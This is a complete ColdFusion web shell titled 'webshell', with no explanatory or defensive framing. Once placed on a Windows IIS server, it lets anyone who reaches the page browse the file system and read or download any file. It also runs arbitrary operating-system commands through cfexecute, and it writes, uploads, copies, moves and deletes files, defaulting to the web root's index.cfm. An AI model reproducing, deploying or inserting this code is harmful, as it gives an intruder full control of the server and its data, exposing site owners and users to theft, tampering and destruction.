
<CFPARAM NAME="Form.path" DEFAULT="C:\Inetpub\wwwroot\">
<CFPARAM NAME="Form.filepath" DEFAULT=".">

<CFIF #Form.filepath# IS NOT ".">
<CFFILE ACTION="Read" FILE="#Form.filepath#" VARIABLE="Message">
<CFOUTPUT>#htmlCodeFormat(Message)#</CFOUTPUT>
<CFABORT>
</CFIF>


<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>webshell</title>
<STYLE type="text/css">
body,td {FONT-SIZE: 14px;}
a {COLOR: 0000FF; TEXT-DECORATION: none}
</STYLE>

<script language="javascript">
<!--

  function yesok(){
    if (confirm("Are you sure to do that£¿"))
		return true;
	else
		return false;
    }

  function ShowFolder(Folder){
	FolderPath.path.value += Folder + "\\";
	FolderPath.submit();
    }
  function ShowFile(File){
	hideform.filepath.value = FolderPath.path.value + File;
	hideform.submit();
    }
  function DownFile(File1){
	hideform1.filepath1.value = FolderPath.path.value + File1;
	hideform1.submit();
	}
-->
</script>
</head>
<body>


<TABLE cellSpacing=1 cellPadding=0 width="50%" border=0 BGCOLOR="CCCCCC">
<form action="" name="FolderPath" method="post">
	<TR>
		<TD>
		Dir Path£º
		<CFOUTPUT>
		<input name="path" value="#Form.path#" style="width:200">
		</CFOUTPUT>
		<input type=submit value=" Show Curr Path File ">
		</TD>
	</TR>
</form>
</TABLE>

<CFDIRECTORY DIRECTORY="#Form.path#" NAME="mydirectory" SORT="size ASC, name DESC, datelastmodified">

<TABLE cellSpacing=1 cellPadding=0 width="50%" border=0 BGCOLOR="CCCCCC">
	<TR BGCOLOR="CCCCCC">
		<TD height=25>Dir/File</TD>
		<TD>download</TD>
		<TD>ChangeTime</TD>
		<TD>Size</TD>
		<TD>Attribute</TD>
		
	</TR>
	<TR BGCOLOR="EFEFEF">
<TD><a href="javascript:ShowFolder('..')">..</a></TD>
		<TD></TD>
		<TD></TD>
		<TD></TD>
		<TD></TD>
	</TR>

<CFOUTPUT QUERY="mydirectory">

<CFIF #mydirectory.type# IS "Dir">
	<TR BGCOLOR="EFEFEF">
		<TD><a href="javascript:ShowFolder('#mydirectory.name#')">#mydirectory.name#</a></TD>
		<TD> </a></TD>
<CFELSE>
	<TR BGCOLOR="FFFFFF">
		<TD><a href="javascript:ShowFile('#mydirectory.name#')">#mydirectory.name#</a></TD>
		<TD><a href="javascript:DownFile('#mydirectory.name#')">down</a></TD>
</CFIF>
		<TD>#mydirectory.datelastmodified#</TD>
		<TD>#mydirectory.size#</TD>
		<TD>#mydirectory.attributes#</TD>
		
	</TR>
</CFOUTPUT>

</TABLE>

<Form name="hideform" method="post" action="" target="_blank">
	<input type="hidden" name="filepath" value=".">
</Form>

<Form name="hideform1" method="post" action="" target="_blank">
	<input type="hidden" name="filepath1">
</Form>


<cfif IsDefined("FORM.filepath1")>
<cfheader name="Content-Disposition" value="attachment; filename=#Form.filepath1#"> 
<CFFILE ACTION="Read" FILE="#Form.filepath1#" VARIABLE="Message">
				<cfcontent file="#Form.filepath1#" type="application/octet-stream">
</CFIF>


<!--- os.run --->
<cfif IsDefined("FORM.cmd")>
    <cfoutput>#cmd#</cfoutput>
    <cfexecute name="#x#"
           arguments="#cmd#"
           outputfile="#GetTempDirectory()#foobar.txt"
           timeout="1">
    </cfexecute>
</cfif>
<form action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>" method="post">
<input type=text size=60 name="cmd" >
<input type=text name="x" >
<input type=Submit value=" CmdRun ">
</form>
<cfif FileExists("#GetTempDirectory()#foobar.txt") is "Yes">
  <cffile action="Read"
            file="#GetTempDirectory()#foobar.txt"
            variable="readText">
<textarea readonly cols=80 rows=20>
<CFOUTPUT>#readText#</CFOUTPUT>         
</textarea>
    <cffile action="Delete"
            file="#GetTempDirectory()#foobar.txt">
</cfif>



<CFPARAM NAME="Form.Action" DEFAULT="ShowPost">
<CFSWITCH EXPRESSION=#Form.Action#>

<CFCASE VALUE="read">
<CFFILE ACTION="Read" FILE="#Form.path#" VARIABLE="Message">
<CFOUTPUT>#htmlCodeFormat(Message)#</CFOUTPUT>
</CFCASE>

<CFCASE VALUE="write">
<CFFILE ACTION="Write" FILE="#Form.path#" OUTPUT="#Form.cmd#">
Write Successful
</CFCASE>

<CFCASE VALUE="copy">
<CFFILE ACTION="Copy" SOURCE="#Form.source#" DESTINATION="#Form.DESTINATION#">
Copy Successful
</CFCASE>

<CFCASE VALUE="move">
<CFFILE ACTION="MOVE" SOURCE="#Form.source#" DESTINATION="#Form.DESTINATION#">
Move Successful
</CFCASE>

<CFCASE VALUE="delete">
<CFFILE ACTION="Delete" FILE="#Form.path#">
Del Successful
</CFCASE>


<CFCASE VALUE="upload">
<CFFILE ACTION="UPLOAD" FILEFIELD="FileContents" DESTINATION="#Form.path#" NAMECONFLICT="OVERWRITE">

Upload Successful
</CFCASE>

<CFDEFAULTCASE>

<form action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>" target="_blank" method=post>
<textarea style="width:600;height:200" name="cmd"></textarea><br>
<input name="path" value="C:\Inetpub\wwwroot\index.cfm" size=72>
<input type=submit value="Write File">
<input type=hidden name="action" value="write">
</form>
<br>

<form action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>" target="_blank" method=post>
<input name="path" value="C:\Inetpub\wwwroot\index.cfm" size=72>
<input type=submit value="Show File Content">
<input type=hidden name="action" value="read">
</form>
<br>



<form action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>" target="_blank" method=post>
<input name="path" value="C:\Inetpub\wwwroot\index.cfm" size=72>
<input type=submit value="Del Selected File">
<input type=hidden name="action" value="delete">
<br>

<FORM ACTION="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>" ENCTYPE="multipart/form-data" METHOD="Post" target="_blank">
Upload Path£º<INPUT NAME="path" value="C:\Inetpub\wwwroot\index.cfm" size=62><br>
Local File£º<INPUT NAME="FileContents" TYPE="file" size=40 >
<input type=hidden name="action" value="Upload">
 <INPUT TYPE="submit" VALUE="Upload">
</FORM>
<br>

			<cfform enctype="multipart/form-data" method="post">
				<span class="STYLE4">up folder:</span><INPUT NAME="path" value="C:\Inetpub\wwwroot\index.cfm" size=62><br><br>
				<span class="STYLE6">Choose to download files:</span> 
				<input type="file" size="80" name="fileup" /> <input type="submit" value="T&##7843;i l&##234;n" /><br/>
			</cfform>
			<cfif isDefined("fileup")>
				<cffile action="upload" fileField="fileup" destination="#Form.path#" nameconflict="overwrite">
			</cfif>

<br>

<form action="" target="_blank" method=post>
Source File£º<input name="source" value="C:\Inetpub\wwwroot\index.cfm" size=65><br>
Copy to£º<input name="DESTINATION" value="C:\Inetpub\wwwroot\down\download.cfm" size=65>
<input type=submit value=" Copy File ">
<input type=hidden name="action" value="copy">
</form>

<br>

<form action="" target="_blank" method=post>
Source File£º<input name="source" value="C:\Inetpub\wwwroot\index.cfm" size=65><br>
Move to£º<input name="DESTINATION" value="C:\Inetpub\wwwroot\down\download.cfm" size=65>
<input type=submit value=" Move File ">
<input type=hidden name="action" value="Move">
</form>


</form>

</CFDEFAULTCASE>

</CFSWITCH>

</body>
</html>